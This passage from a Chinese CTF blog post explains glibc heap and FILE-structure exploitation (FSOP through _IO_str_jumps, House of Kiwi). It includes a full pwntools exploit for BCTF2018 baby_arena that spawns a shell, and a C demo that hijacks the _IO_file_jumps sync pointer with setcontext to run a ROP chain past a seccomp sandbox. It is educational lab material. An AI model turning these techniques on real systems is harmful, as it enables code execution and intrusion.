偏移的方法，思想与采用动态调试分析的方法类似，直接放代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_IO_str_jumps</span>():<br>   IO_file_jumps_offset = libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>   IO_str_underflow_offset = libc.sym[<span class="hljs-string">&#x27;_IO_str_underflow&#x27;</span>]<br>   <span class="hljs-keyword">for</span> ref_offset <span class="hljs-keyword">in</span> libc.search(p64(IO_str_underflow_offset)):<br>       possible_IO_str_jumps_offset = ref_offset - <span class="hljs-number">0x20</span><br>       <span class="hljs-keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:<br>          <span class="hljs-keyword">return</span> possible_IO_str_jumps_offset<br></code></pre></td></tr></table></figure><h3 id="例题-v2"><a class="header-anchor" href="#例题-v2">¶</a>例题</h3><h4 id="baby-arena-BCTF2018-libc2-27-3ubuntu1-2"><a class="header-anchor" href="#baby-arena-BCTF2018-libc2-27-3ubuntu1-2">¶</a>baby_arena_BCTF2018 &lt;libc2.27-3ubuntu1.2&gt;</h4><h5 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h5><p>和 2.23 一样。</p><h5 id="思路-v2"><a class="header-anchor" href="#思路-v2">¶</a>思路</h5><p>思路和上题一毛一样。注意改一下偏移，以及 global_max_fast 利用时候的堆块大小。</p><h5 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./baby_arena&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;4.exit\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;your note size&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Input your note&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Input id:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aw</span>(<span class="hljs-params">addr0,addr1</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sea(<span class="hljs-string">&#x27;Please input your name&#x27;</span>,p64(addr0)+p64(addr1))<br>    sla(<span class="hljs-string">&#x27;1.admin&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Leak the Libc-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x1430</span>) <span class="hljs-comment"># 1</span><br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>)<br>ru(<span class="hljs-string">&#x27;your note is\n&#x27;</span>)<br>libc_leak = uu64(rc(<span class="hljs-number">6</span>))<br>libc_base = libc_leak - <span class="hljs-number">0x3ebca0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x3e8360</span><br>sh_addr = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system_addr = libc.sym.system<br>global_max_fast = libc_base + <span class="hljs-number">0x3ed940</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[+]-----Global max fast-----[+]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pause()<br><span class="hljs-comment"># aw(one_gadget,libc_base+0x3c67f8-8)</span><br>aw(system_addr,global_max_fast - <span class="hljs-number">8</span>)<br>pause()<br>dele(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x410</span>+p64(<span class="hljs-number">0</span>))<br>dele(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">binsh,system,IO_str_jumps</span>):<br>fake_IO_FILE  = p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64((binsh-<span class="hljs-number">100</span>)//<span class="hljs-number">2</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><span class="hljs-comment"># _mode &lt;= 0</span><br>fake_IO_FILE += p64(IO_str_jumps)<br>fake_IO_FILE += p64(system) <span class="hljs-comment"># 0xe0 _s._allocate_buffer</span><br><span class="hljs-keyword">return</span> fake_IO_FILE<br><br>fake_IO = FILE(sh_addr,system_addr,_IO_str_jumps)<br><br>add(<span class="hljs-number">0x1430</span>,fake_IO[<span class="hljs-number">0x10</span>:])<br>dele(<span class="hljs-number">1</span>)<br>pause()<br>sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h5 id="调试-v2"><a class="header-anchor" href="#调试-v2">¶</a>调试</h5><p>调试拿 <strong>_IO_str_overflow</strong> 简单过一遍。看完了 2.23 后 2.27 只需要明白咋进的 <code>_IO_str_overflow</code> 就行了。</p><p>我们构造的结构体：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525200847128.png" alt="image-20220525200847128"></p><p>结构体 vtable 函数表：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525200927604.png" alt="image-20220525200927604"></p><p>那么在遍历到我们的结构体调用 <code>_IO_OVERFLOW</code> 实际就是在调用 <code>_IO_str_overflow</code>。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525201020570.png" alt="image-20220525201020570"></p><p>一路 si 跟进，最后在预期位置 getshell ：</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525201106629.png" alt="image-20220525201106629"></p><hr><h2 id="Libc"><a class="header-anchor" href="#Libc">¶</a>??? &lt;= Libc &lt;= ???</h2><blockquote><p>kiwi 是利用路线，必要的话用 husk 过渡，emma 和 pig 是利用方法。</p><footer><strong>风沐云烟</strong></footer></blockquote><p>👴 其实是就是为了写这部分才开的这篇博客。从这里开始才能称作是搞艺术。</p><p><strong>???</strong> 的意思是这下面的几个利用涉及到的思想和手法，从过去一直到未来的一段时间里不会过时。</p><p>你暂时看不到就是 👴 还没写完。</p><h3 id="House-of-Kiwi-libc-2-36我真的哭死"><a class="header-anchor" href="#House-of-Kiwi-libc-2-36我真的哭死">¶</a>House of Kiwi(libc&lt;2.36我真的哭死)</h3><p>先看一下这几个中我最先学习到的 <strong>kiwi</strong> ，由 <code>fmyy</code> 师傅提出，发表于 <a href="https://www.anquanke.com/post/id/235598">安全客</a> 。</p><h4 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h4><h5 id="malloc-assert"><a class="header-anchor" href="#malloc-assert">¶</a>__malloc_assert</h5><ul><li><p>GLIBC 2.32/malloc.c:288</p><p>glibc中ptmalloc部分,从以前到现在都存在一个assret断言的问题,此处存在一个 <strong>fflush(stderr)</strong> 的函数调用,其中会调用<code>_IO_file_jumps</code> 中的sync指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CPP"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>(<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>           __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           file, line,<br>           function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           assertion);<br><span class="hljs-built_in">fflush</span> (stderr);<br><span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>fflush:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> fflush(s) _IO_fflush (s)</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_fflush (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> _IO_flush_all ();<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-type">int</span> result;<br>      CHECK_FILE (fp, EOF);<br>      _IO_acquire_lock (fp);<br>      result = _IO_SYNC (fp) ? EOF : <span class="hljs-number">0</span>;<br>      _IO_release_lock (fp);<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br>libc_hidden_def (_IO_fflush)<br></code></pre></td></tr></table></figure><p>其中调用了 vtable 对应偏移的 <code>_IO_SYNC</code> 函数。如果你知道低版本的 FSOP 的基本原理，那么大概就知道 <strong>kiwi</strong> 的利用思路了。</p></li></ul><h4 id="使用场景"><a class="header-anchor" href="#使用场景">¶</a>使用场景</h4><ol><li><p>能够触发<code>__malloc_assert</code>,通常是堆溢出导致，但 👴 发现实际过程中大多数都是 🐑 topchunk。</p></li><li><p>能够任意写,修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_file_sync = setcontext + <span class="hljs-number">61</span><span class="hljs-comment">// &amp;_IO_file_jumps + 0x60</span><br></code></pre></td></tr></table></figure><p>和</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">IO_helper_jumps + <span class="hljs-number">0xA0</span> and <span class="hljs-number">0xA8</span><br><span class="hljs-comment">//   rsp      rcx</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="俩点说明"><a class="header-anchor" href="#俩点说明">¶</a>俩点说明</h4><p>关于场景 1，🐑 topchunk 有很多种 🐑 法，常用的有：</p><ol><li>直接溢出或者分配个 chunk 去把 topchunk size 扬了</li><li>Largebin Attack 错位打 topchunk size</li><li>Largebin Attack 或者分配个 chunk 过去 🐑 main_arena 中的 topchunk 坑位</li></ol><p>关于场景 2，👴 不得不提一哈，这只是<strong>最初最基本</strong>的 kiwi 需要任意写这个比较强的条件，fmyy 师傅还教了 👴 和其他的 house 一起玩的仅 <code>Largebin Attack</code> 较弱条件思路，具体的话后续的例题应该会有。</p><h4 id="Demo-v2"><a class="header-anchor" href="#Demo-v2">¶</a>Demo</h4><p>fmyy 师傅演示的 DEMO：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs CPP"><span class="hljs-comment">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span><br><span class="hljs-comment">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ret pop_rdi_ret+1</span><br><span class="hljs-type">size_t</span> libc_base;<br><span class="hljs-type">size_t</span> ROP[<span class="hljs-number">0x30</span>];<br><span class="hljs-type">char</span> FLAG[<span class="hljs-number">0x100</span>] = <span class="hljs-string">&quot;./flag.txt\x00&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sandbox</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">prctl</span>(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_filter</span> sfi[] =&#123;<br>        &#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000004</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0xC000003E</span>&#125;,<br>        &#123;<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;,<br>        &#123;<span class="hljs-number">0x35</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x40000000</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0xFFFFFFFF</span>&#125;,<br>        &#123;<span class="hljs-number">0x15</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0000003B</span>&#125;,<br>        &#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x7FFF0000</span>&#125;,<br>        &#123;<span class="hljs-number">0x06</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00000000</span>&#125;<br>    &#125;;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sock_fprog</span> sfp = &#123;<span class="hljs-number">8</span>, sfi&#125;;<br>    <span class="hljs-built_in">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setROP</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>;<br>    ROP[i++] = pop_rax_ret;<br>    ROP[i++] = <span class="hljs-number">2</span>;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)FLAG;<br>    ROP[i++] = pop_rsi_ret;<br>    ROP[i++] = <span class="hljs-number">0</span>;<br>    ROP[i++] = syscall_ret;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = <span class="hljs-number">3</span>;<br>    ROP[i++] = pop_rdx_r12;<br>    ROP[i++] = <span class="hljs-number">0x100</span>;<br>    ROP[i++] = <span class="hljs-number">0</span>;<br>    ROP[i++] = pop_rsi_ret;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)(FLAG + <span class="hljs-number">0x10</span>);<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)read;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = <span class="hljs-number">1</span>;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)write;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">setvbuf</span>(stdin,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">setvbuf</span>(stdout,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">setvbuf</span>(stderr,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">sandbox</span>();<br>    libc_base  = ((<span class="hljs-type">size_t</span>)setvbuf) - <span class="hljs-number">0x81630</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);<br><br>    <span class="hljs-type">size_t</span> magic_gadget = libc_base + <span class="hljs-number">0x53030</span> + <span class="hljs-number">61</span>; <span class="hljs-comment">// setcontext + 61</span><br>    <span class="hljs-type">size_t</span> IO_helper = libc_base + <span class="hljs-number">0x1E48C0</span>; <span class="hljs-comment">// _IO_hel</span><br>    per_jumps;<br>    <span class="hljs-type">size_t</span> SYNC = libc_base + <span class="hljs-number">0x1E5520</span>; <span class="hljs-comment">// sync pointer in _IO_file_jumps</span><br>    <span class="hljs-built_in">setROP</span>();<br>    *((<span class="hljs-type">size_t</span>*)IO_helper + <span class="hljs-number">0xA0</span>/<span class="hljs-number">8</span>) = ROP; <span class="hljs-comment">// 设置rsp</span><br>    *((<span class="hljs-type">size_t</span>*)IO_helper + <span class="hljs-number">0xA8</span>/<span class="hljs-number">8</span>) = ret; <span class="hljs-comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span><br>    *((<span class="hljs-type">size_t</span>*)SYNC) = magic_gadget; <span class="hljs-comment">// 设置fflush(stderr)中调用的指令地址</span><br>    <span class="hljs-comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span><br>    <span class="hljs-type">size_t</span> *top_size = (<span class="hljs-type">size_t</span>*)((<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>) + <span class="hljs-number">0x18</span>);<br>    *top_size = (*top_size)&amp;<span class="hljs-number">0xFFE</span>; <span class="hljs-comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>); <span class="hljs-comment">// 触发assert</span><br>    _exit(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="调试和例题"><a class="header-anchor" href="#调试和例题">¶</a>调试和例题</h4><p>👴 私自认为 <strong>kiwi 简洁但不简单</strong>，简洁到简单改改 demo 就能在其他的题目里打 <strong>ROP</strong> 绕沙箱。又不简单到必须<strong>自己调试</strong>，才能较好地掌握这一利用路线，了解其中细节，以后和其他方法结合起来才能比较从容。</p><h5 id="ez-kiwi"><a class="header-anchor" href="#ez-kiwi">¶</a>ez_kiwi</h5><p>出自 BUUCTF 的 <a 